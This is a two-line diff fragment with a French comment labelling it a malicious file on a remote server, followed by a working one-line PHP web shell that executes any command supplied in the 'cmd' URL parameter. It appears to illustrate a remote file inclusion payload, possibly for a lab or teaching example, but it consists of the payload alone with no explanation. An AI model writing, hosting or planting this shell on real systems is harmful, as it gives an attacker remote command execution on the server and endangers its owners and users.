@@ -1,0 +1,2 @@
+// Fichier malveillant sur serveur distant contenant :
+<?php system($_GET['cmd']); ?>
